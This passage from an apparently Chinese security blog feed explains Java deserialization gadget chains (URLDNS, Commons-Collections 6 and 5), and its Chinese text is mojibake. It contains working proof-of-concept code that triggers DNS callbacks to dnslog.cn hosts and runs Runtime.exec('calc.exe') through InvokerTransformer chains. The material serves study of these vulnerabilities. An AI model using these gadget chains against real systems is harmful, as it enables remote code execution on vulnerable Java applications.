class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://7gjq24.dnslog.cn&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">       f.setAccessible(<span class="literal">true</span>); <span class="comment">// ç»•è¿‡Javaè¯­è¨€æƒé™æ§åˆ¶æ£€æŸ¥çš„æƒé™</span></span><br><span class="line">       f.set(url,<span class="number">123</span>); <span class="comment">// è®¾ç½®hashcodeçš„å€¼ä¸º-1çš„å…¶ä»–ä»»ä½•æ•°å­—</span></span><br><span class="line">       System.out.println(url.hashCode());</span><br><span class="line">       map.put(url,<span class="number">123</span>); <span class="comment">// è°ƒç”¨HashMapå¯¹è±¡ä¸­çš„putæ–¹æ³•ï¼Œæ­¤æ—¶å› ä¸ºhashcodeä¸ä¸º-1ï¼Œä¸å†è§¦å‘dnsæŸ¥è¯¢</span></span><br><span class="line">       f.set(url,-<span class="number">1</span>); <span class="comment">// å°†hashcodeé‡æ–°è®¾ç½®ä¸º-1ï¼Œç¡®ä¿åœ¨ååºåˆ—åŒ–æˆåŠŸè§¦å‘</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">           <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line"></span><br><span class="line">           outputStream.writeObject(map);</span><br><span class="line">           outputStream.close();</span><br><span class="line">           fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">           <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">           <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">           inputStream.readObject();</span><br><span class="line">           inputStream.close();</span><br><span class="line">           fileInputStream.close();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨è¿›è¡Œputä¹‹å‰URLå¯¹è±¡ä¹‹å‰æˆ‘ä»¬åå°„ä¿®æ”¹äº†å…¶hashcodeçš„å€¼ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Œæ˜¯å› ä¸ºåœ¨åºåˆ—åŒ–çš„æ—¶å€™writeobject ä¼šå†™å…¥key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">buckets</span> <span class="operator">=</span> capacity();</span><br><span class="line">        <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeInt(buckets);</span><br><span class="line">        s.writeInt(size);</span><br><span class="line">        internalWriteEntries(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">internalWriteEntries</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      Node&lt;K,V&gt;[] tab;</span><br><span class="line">      <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">              <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                  s.writeObject(e.key);</span><br><span class="line">                  s.writeObject(e.value);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡Œçš„keyä»¥åŠvalueæ˜¯ä»tabä¸­å–çš„ï¼Œè€Œtabçš„å€¼å³HashMapä¸­tableçš„å€¼ã€‚æ­¤æ—¶æˆ‘ä»¬å¦‚æœæƒ³è¦ä¿®æ”¹tableçš„å€¼ï¼Œå°±éœ€è¦è°ƒç”¨HashMap#putæ–¹æ³•ï¼Œè€ŒHashMap#putæ–¹æ³•ä¸­ä¹Ÿä¼šå¯¹keyè°ƒç”¨ä¸€æ¬¡hashæ–¹æ³•ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå°±ä¼šäº§ç”Ÿç¬¬ä¸€æ¬¡dnsæŸ¥è¯¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNStest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://razgbd.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">//æ­¤æ—¶ä¼šäº§ç”ŸdnsæŸ¥è¯¢</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¦æƒ³ä¸åœ¨putçš„æ—¶å€™å‘èµ·dnsè¯·æ±‚éœ€è¦åå°„ä¿®æ”¹å…¶hashcodeçš„å€¼è®©å…¶ä¸ä¸º-1å³å¯å› ä¸ºä¸ä¸º-1ä¼šç›´æ¥è¿”å›hashcodeçš„å€¼ä¸ä¼šè¿›è¡Œåç»­çš„è°ƒç”¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714232350597-a9d56e20-f65f-424e-98f4-2d6a0a232f99.png"></p><p>é‚£ysoserialåœ¨putæ—¶æ˜¯æ€ä¹ˆä¸è§¦å‘dnsè¯·æ±‚çš„å‘¢è°ƒè¯•ä¸€ä¸‹ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235280291-9d23edfb-4a62-48ec-b317-73c2783170c9.png"></p><p>åœ¨è°ƒç”¨åˆ°ç®­å¤´æ‰€æŒ‡å‘çš„æ–¹æ³•æ—¶å…¶è¿”å›ä¸€ä¸ªnullå€¼ï¼Œä»è€Œä¸è§¦å‘dnsè¯·æ±‚<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235322122-f98710a8-b5f4-4c17-bb18-8335d5bc7b9e.png"></p><p>é‚£ä¸ºä»€ä¹ˆååºåˆ—åŒ–æ—¶åˆèƒ½å¤Ÿå‘èµ·è¯·æ±‚äº†å‘¢æ˜¯å› ä¸ºURLç±»ä¸­handlerè¢«è®¾ç½®ä¸º transientï¼ˆå½“ä¸€ä¸ªå­—æ®µè¢«å£°æ˜ä¸º transient æ—¶ï¼Œè¡¨ç¤ºè¯¥å­—æ®µä¸ä¼šå‚ä¸å¯¹è±¡çš„åºåˆ—åŒ–è¿‡ç¨‹ï¼Œå³åœ¨å°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµä»¥ä¾¿è¿›è¡Œå­˜å‚¨æˆ–ä¼ è¾“æ—¶ï¼Œè¿™äº›å­—æ®µçš„å€¼ä¸ä¼šè¢«åŒ…å«åœ¨åºåˆ—åŒ–çš„ç»“æœä¸­ã€‚ï¼‰<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714235649137-224edc64-5083-4337-839c-86b8ceaf2395.png"></p><p>æ‰€ä»¥ååºåˆ—åŒ–å¯ä»¥è§¦å‘dnsè¯·æ±‚</p><p>å‚è€ƒï¼š<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631738506-bbe121c1-93dc-46af-bbf1-f404742d8cf6.pdf">Javaå®‰å…¨æ¼«è°ˆ - 09.ååºåˆ—åŒ–ç¯‡(3).pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> URLDNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collections6ååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ysoserialä¸­ï¼ŒCommonsCollections6å¯ä»¥è¯´æ˜¯commons-collectionsè¿™ä¸ªåº“ä¸­ç›¸å¯¹â½è¾ƒé€šâ½¤çš„åˆ©â½¤ é“¾ï¼Œä¸ºäº†è§£å†³â¾¼ç‰ˆæœ¬Javaçš„åˆ©â½¤é—®é¢˜ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è¿™ä¸ªåˆ©â½¤é“¾ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6_test</span> &#123;</span><br><span class="line">    <span class="comment">//å®šä¹‰åºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fake_transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fake_transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(key,<span class="string">&quot;sss&quot;</span>);</span><br><span class="line">        decorate.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//serialize(hashMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”±äºåœ¨java  8u71ï¼Œè¿™ä¸ªåˆ©â½¤é“¾ä¸èƒ½å†åˆ©â½¤äº†ï¼Œä¸»è¦åŸå›  æ˜¯sun.reflect.annotation.AnnotationInvocationHandler#readObject çš„é€»è¾‘å˜åŒ–äº†ã€‚</p><p>ysoserialä½œè€…æ‰¾åˆ°äº†å¦ä¸€æ¡èƒ½å¤Ÿè§¦å‘lazymapçš„æ–¹æ³•ï¼Œå°±æ˜¯TiedMapEntryè¿™ä¸ªç±»ä¸­çš„getValueæ–¹æ³•ä¸­è°ƒç”¨äº†getæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631173688-6b2f4fa3-9729-4e57-a6d4-ffcde6469ec7.png"></p><p>åœ¨å…¶åŒç±»ä¸­çš„hashcodeæ–¹æ³•è°ƒç”¨äº†getæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631197142-e2200442-a755-48e6-bbd1-283141a6b22b.png"></p><p>æ‰€ä»¥æˆ‘ä»¬æƒ³è¦è¿›è¡Œrceå°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è§¦å‘hashcodeçš„æ–¹æ³•ï¼Œåœ¨URLDNSé“¾ä¸­æˆ‘ä»¬çŸ¥é“hashmapçš„readobjectä¸­è°ƒç”¨äº†hashæ–¹æ³•ï¼Œè€Œå…¶hashæ–¹æ³•ä¸­åˆè°ƒç”¨äº†hashcodeæ–¹æ³•ï¼Œæ‰€ä»¥è°ƒç”¨é“¾å°±å‡ºæ¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fake_transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fake_transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(key,<span class="string">&quot;sss&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(chainedTransformer, transformers);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”±äºhasmapåœ¨putçš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨hashæ–¹æ³•æ‰€ä»¥æˆ‘ä»¬å…ˆç”¨ä¸€ä¸ªå‡çš„invokertransformerè¿›è¡Œputç„¶ååœ¨åå°„ä¿®æ”¹æˆçœŸçš„å°±ä¸ä¼šåœ¨putçš„æ—¶å€™è§¦å‘äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™æ ·ååºåˆ—åŒ–è¿è¡Œåå‘ç°ä¹Ÿæ²¡æœ‰è§¦å‘ï¼Œè¿™æ˜¯ä»€ä¹ˆåŸå› ï¼Œæˆ‘ä»¬è·Ÿè¿›æ¥çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631432833-aa4fdbc8-ce47-40e3-9f90-21c1541abfdd.png">æˆ‘ä»¬å‘ç°åœ¨lazymapä¸­å¹¶æ²¡æœ‰è¿›å…¥ifæ¡ä»¶ï¼Œè¿™è¯´æ˜keyè¢«ä¼ å…¥äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰ç»™lazymaoä¼ å…¥å€¼ï¼Œè¿™é‡Œé€šè¿‡è°ƒè¯•å‘ç°æˆ‘ä»¬åœ¨hashmapè¿›è¡Œputçš„æ—¶å€™è¿›å…¥lazymapçš„ifæ¡ä»¶ä¹‹åå¦‚æœæ²¡æœ‰keyå€¼ä»–æ˜¯ä¼šåœ¨è¿›è¡Œputè¿›å»çš„æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨putä¹‹ååœ¨è¿›è¡Œåˆ é™¤å³å¯pocå¦‚å¼€å¤´ã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_49125123/article/details/135232651">https://blog.csdn.net/weixin_49125123&#x2F;article&#x2F;details&#x2F;135232651</a> <a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631644198-f098a5bc-21e1-44bd-ad0f-51db9c50d07f.pdf">Javaå®‰å…¨æ¼«è°ˆ - 12.ååºåˆ—åŒ–ç¯‡(6).pdf</a></p><h3 id="cc6è°ƒç”¨é“¾"><a href="#cc6è°ƒç”¨é“¾" class="headerlink" title="cc6è°ƒç”¨é“¾"></a>cc6è°ƒç”¨é“¾</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714668463375-9a53c70d-4ae7-414f-a145-96b13370c7c6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collections5ååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>cc5çš„è°ƒç”¨é“¾å’Œcc1 lazyMapè°ƒç”¨é“¾å¾ˆç›¸ä¼¼ï¼Œåªä¸è¿‡cc5è°ƒç”¨é“¾æœ€åè§¦å‘getæ–¹æ³•é‚£é‡Œå˜æˆäº†TiedMapEntryçš„toStringæ–¹æ³•ï¼Œç„¶ååˆ©ç”¨BadAttributeValueExpExceptionçš„readObjectè§¦å‘ã€‚</p><p>çœ‹ä¸€ä¸‹poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;11&quot;</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line">        <span class="comment">//serialize(badAttributeValueExpException);</span></span><br><span class="line">        